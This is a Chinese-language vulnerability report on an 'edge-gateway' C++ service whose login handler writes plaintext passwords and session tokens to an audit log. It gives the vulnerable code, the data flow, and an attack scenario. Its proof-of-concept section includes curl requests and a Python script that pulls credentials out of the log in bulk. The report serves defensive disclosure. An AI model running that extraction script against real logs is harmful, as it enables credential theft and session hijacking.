# VULN-SEC-LOG-002: 登录接口将用户密码明文写入审计日志文件

**严重性**: Critical | **CWE**: CWE-532 (Insertion of Sensitive Information into Log File) | **置信度**: 85/100
**位置**: `include/audit_log.hpp:11-14` @ `AuditLog::event`

---

## 1. 漏洞细节

该漏洞存在于 edge-gateway 应用的审计日志模块中。当用户通过 POST /login 接口提交登录请求时，处理函数将整个 `request.body`（包含 `user=<用户名>&password=<密码>` 表单数据）作为 `detail` 参数直接传递给 `AuditLog::event()` 方法。`event()` 方法将 `detail` 内容原封不动地写入日志文件 `edge-gateway.audit.log`，没有任何敏感字段过滤或脱敏处理。

**漏洞根因分析**：

1. **设计缺陷**：`AuditLog::event()` 方法接受任意字符串作为 `detail` 参数并直接写入日志，缺乏对敏感信息的识别和过滤机制。
2. **调用不当**：POST /login 处理函数在 `main.cpp:43` 处将完整的 `request.body` 传入审计日志，而非仅记录必要的非敏感信息（如用户名、登录时间戳等）。
3. **数据流无阻断**：从网络接收数据（`recv()`）到写入日志文件（`out_ << detail`），整个数据流路径上不存在任何敏感信息清洗步骤。

**附带问题**：在 `main.cpp:50` 处，登录成功后还会将会话令牌（session token）作为 `detail` 记录到审计日志中（`audit.event(username, "login-success", token)`），导致会话令牌同样以明文形式存储在日志文件中。

## 2. 漏洞代码

**文件**: `include/audit_log.hpp` (行 1-19)

```cpp
#pragma once

#include <fstream>
#include <string>
#include <ctime>

class AuditLog {
 public:
  explicit AuditLog(const std::string& path) : out_(path, std::ios::app) {}

  // [漏洞点] detail 参数被原封不动写入日志，无任何脱敏处理
  void event(const std::string& user, const std::string& action, const std::string& detail) {
    out_ << std::time(nullptr) << " user=" << user           // 行 12
         << " action=" << action                              // 行 13
         << " detail=" << detail << "\n";                     // 行 14 ← SINK: 密码明文写入
  }

 private:
  std::ofstream out_;
};
```

**文件**: `src/main.cpp` (行 40-52) — 调用侧

```cpp
  server.route("POST", "/login", [&](const HttpRequest& request) {
    std::string username = queryValue(request, "user");       // 行 41
    std::string password = queryValue(request, "password");   // 行 42
    audit.event(username, "login-attempt", request.body);     // 行 43 ← 将整个 body（含密码）传入日志

    if (!users.authenticate(username, password)) {
      return text(401, "invalid credentials\n");
    }

    std::string token = users.issueSession(username);
    audit.event(username, "login-success", token);            // 行 50 ← 会话令牌也被记录
    return text(200, "session=" + token + "\n");
  });
```

**文件**: `src/http_server.cpp` (行 42-69) — 请求解析

```cpp
HttpRequest HttpServer::parseRequest(const std::string& raw) const {
  HttpRequest request;
  std::istringstream stream(raw);
  // ... 解析 method, path, query, headers ...

  std::ostringstream body;
  body << stream.rdbuf();          // 行 66: 将剩余流内容完整读入 body，无任何过滤
  request.body = body.str();       // 行 67: request.body 包含完整 POST 表单数据
  return request;
}
```

**逐段分析**：

- `http_server.cpp:65-67`：`stream.rdbuf()` 将 HTTP 请求头之后的所有内容原样复制到 `request.body`，包括 `user=admin&password=secret123` 等表单数据，不做任何字段过滤。
- `main.cpp:43`：将完整的 `request.body` 作为 `detail` 参数传给 `audit.event()`。注意此调用位于认证逻辑（行 45）**之前**，因此无论登录成功或失败，密码都会被记录。
- `audit_log.hpp:12-14`：`out_ << detail` 将 `detail` 字符串直接写入 `ofstream`，日志文件以追加模式（`std::ios::app`）打开，所有记录永久保留。

## 3. 完整攻击链路

```
[网络入口] recv()@src/http_server.cpp:113
↓ 原始 HTTP 数据（包含 POST body: user=<username>&password=<password>）
[请求解析] parseRequest()@src/http_server.cpp:42
↓ stream.rdbuf() 将 body 完整复制到 request.body（行 65-67），无任何过滤
[路由分发] handler->second(request)@src/http_server.cpp:127
↓ request 对象传递给 POST /login 处理 lambda
[登录处理] lambda(POST /login)@src/main.cpp:40
↓ request.body（含密码）作为 detail 参数传递（行 43）
[审计日志] AuditLog::event()@include/audit_log.hpp:11
↓ out_ << detail 将密码明文写入文件（行 12-14）
[日志文件] edge-gateway.audit.log ← SINK
```

**链路详细说明**：

1. **网络接收**（`http_server.cpp:113`）：`recv(client, buffer, sizeof(buffer) - 1, 0)` 从 TCP 套接字接收最多 4095 字节的原始 HTTP 数据。攻击者完全控制此输入。

2. **请求解析**（`http_server.cpp:42-69`）：`parseRequest()` 解析 HTTP 请求行、头部和正文。第 65-67 行使用 `stream.rdbuf()` 将头部之后的所有剩余数据读入 `request.body`，完整保留所有表单字段，包括密码。

3. **路由分发**（`http_server.cpp:120-127`）：根据 `method + path` 查找已注册的处理器，找到 POST /login 对应的 lambda 函数并调用。

4. **漏洞触发**（`main.cpp:43`）：`audit.event(username, "login-attempt", request.body)` 在认证逻辑之前执行，将包含密码的完整请求体传入审计日志。此行无任何条件判断，必定执行。

5. **写入日志**（`audit_log.hpp:12-14`）：`out_ << detail` 将 `detail` 字符串（即包含密码的请求体）直接追加写入日志文件。

## 4. 攻击场景

**攻击者画像**: 任何能够访问 edge-gateway 服务端口（默认 8080）的网络用户，包括合法用户和恶意攻击者。此漏洞不需要攻击者具备特殊权限——它影响所有通过 POST /login 提交登录请求的用户。

**攻击向量**: 通过 HTTP POST 请求向 /login 端点提交包含密码的表单数据。密码将被自动记录到服务器日志文件中。攻击者后续可通过获取日志文件访问权限来窃取凭据。

**利用难度**: 低

### 攻击步骤

1. **触发密码记录**：向目标服务器发送标准 POST /login 请求，在请求体中包含用户凭据。任何正常的登录尝试都会触发此漏洞。
   ```
   POST /login HTTP/1.1
   Host: target:8080
   Content-Type: application/x-www-form-urlencoded
   
   user=victim&password=SecretP@ss123
   ```

2. **获取日志文件访问权**：攻击者需要获得对 `edge-gateway.audit.log` 文件的读取权限。可能的途径包括：
   - 利用同一服务器上的文件读取漏洞（如本项目的路径遍历漏洞）
   - 通过日志收集系统（如 ELK Stack、Splunk）访问
   - 获取服务器 shell 访问权限
   - 利用不安全的文件权限设置
   - 通过备份系统或监控工具间接获取

3. **提取凭据**：在日志文件中搜索 `login-attempt` 记录，从 `detail=` 字段中提取用户名和密码：
   ```
   1718690400 user=victim action=login-attempt detail=user=victim&password=SecretP@ss123
   ```

4. **利用窃取的凭据**：使用提取到的用户名和密码登录目标系统或其他使用相同凭据的系统。

## 5. 攻击条件

| 条件类型   | 要求               | 说明                                                                                       |
| ---------- | ------------------ | ------------------------------------------------------------------------------------------ |
| 网络可达性 | 需要访问服务端口   | 攻击者需要能够向 edge-gateway 的监听端口（默认 8080）发送 HTTP 请求。无需认证即可触发。    |
| 认证要求   | 无需认证           | 触发漏洞（密码被记录）不需要任何认证。日志记录发生在认证逻辑之前（行 43 在行 45 之前）。    |
| 配置依赖   | 无特殊配置要求     | 审计日志在应用启动时自动创建（`main.cpp:33`），日志文件路径硬编码为 `edge-gateway.audit.log`。 |
| 环境依赖   | 需获取日志文件读取 | 要利用泄露的密码，攻击者需要能够读取日志文件。日志文件权限取决于进程 umask，默认可能较宽松。 |
| 时序条件   | 无时序要求         | 每次 POST /login 请求都会触发日志记录，不存在竞态条件或时序窗口限制。                       |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                                   |
| -------- | ---- | ------------------------------------------------------------------------------------------------------ |
| 机密性   | 高   | 用户密码以明文形式存储在日志文件中。任何能读取日志文件的用户/进程都可获取所有登录用户的凭据。           |
| 完整性   | 中   | 泄露的凭据可被用于冒充合法用户登录系统，进而篡改系统数据。会话令牌同样被记录，可直接劫持用户会话。       |
| 可用性   | 低   | 日志文件本身不会导致服务中断，但大量登录请求可能导致日志文件快速增长，间接影响磁盘空间。               |

**影响范围**: 

- **直接影响**：所有通过 POST /login 接口尝试登录的用户的密码都会被记录。这包括登录成功和登录失败的尝试（因为日志记录在认证之前执行）。
- **横向扩展风险**：
  - 用户通常在多个系统使用相同密码，泄露的凭据可能危及用户在其他系统的账户（凭据填充攻击）。
  - 日志文件通常被集中收集到日志聚合平台，密码泄露范围可能扩展到更多系统和人员。
  - 会话令牌被记录（行 50），攻击者可直接使用令牌劫持已认证的会话。
- **合规影响**：明文存储密码违反 GDPR、PCI-DSS、SOC 2 等安全合规标准中关于敏感数据保护的要求。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1: 触发密码记录（使用 curl）

```bash
# 向目标服务器发送登录请求，密码将被记录到日志文件
curl -X POST http://localhost:8080/login \
  -d "user=testuser&password=MyS3cretP@ss!"
```

### PoC 2: 验证日志文件中的密码泄露

```bash
# 查看审计日志文件，确认密码已被明文记录
cat edge-gateway.audit.log

# 预期输出示例:
# 1718690400 user=testuser action=login-attempt detail=user=testuser&password=MyS3cretP@ss!
```

### PoC 3: 自动化批量提取凭据（Python）

```python
#!/usr/bin/env python3
"""仅供安全测试使用 - 从审计日志中提取泄露的凭据"""
import re

log_file = "edge-gateway.audit.log"
pattern = re.compile(
    r"user=(\S+)\s+action=login-attempt\s+detail=user=([^&]+)&password=(.+)$"
)

with open(log_file, "r") as f:
    for line in f:
        match = pattern.search(line.strip())
        if match:
            log_user, form_user, password = match.groups()
            print(f"[泄露凭据] 用户: {form_user}, 密码: {password}")
```

**使用说明**: 

1. 确保 edge-gateway 服务正在运行（默认端口 8080）
2. 使用 PoC 1 发送登录请求
3. 使用 PoC 2 检查日志文件，确认密码已被明文记录
4. 使用 PoC 3 可批量提取日志中所有泄露的凭据

**预期结果**: 

- 日志文件 `edge-gateway.audit.log` 中将包含一条 `login-attempt` 记录
- `detail=` 字段后将完整显示 `user=testuser&password=MyS3cretP@ss!`，密码以明文形式可见
- 无论登录成功或失败（密码正确与否），密码都会被记录

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+ 或其他支持 POSIX socket 的系统)
- 编译器: GCC 9+ 或 Clang 10+（需支持 C++17 标准）
- 构建工具: CMake 3.16+
- 依赖: 仅需 C++ 标准库，无第三方依赖

### 构建步骤

```bash
# 进入项目目录
cd /scan/project

# 创建构建目录
mkdir -p build && cd build

# 配置和编译
cmake .. -DCMAKE_BUILD_TYPE=Debug
cmake --build .

# 生成的可执行文件位于 build/edge-gateway
```

### 运行配置

```bash
# 启动服务（默认监听 8080 端口）
./edge-gateway

# 或指定端口
./edge-gateway 9090
```

无需额外配置文件。日志文件 `edge-gateway.audit.log` 将在服务运行的当前工作目录中自动创建。

### 验证步骤

1. 启动 edge-gateway 服务：`./edge-gateway`
2. 在另一个终端发送登录请求：
   ```bash
   curl -X POST http://localhost:8080/login -d "user=admin&password=hunter2"
   ```
3. 检查日志文件内容：
   ```bash
   cat edge-gateway.audit.log
   ```
4. 确认日志中包含明文密码

### 预期结果

日志文件 `edge-gateway.audit.log` 将包含类似以下内容：

```
1718690400 user=admin action=login-attempt detail=user=admin&password=hunter2
```

其中 `password=hunter2` 以明文形式完整出现在日志中，证实密码泄露漏洞存在。如果登录成功，还会看到：

```
1718690401 user=admin action=login-success detail=<session_token>
```

会话令牌同样以明文形式被记录。
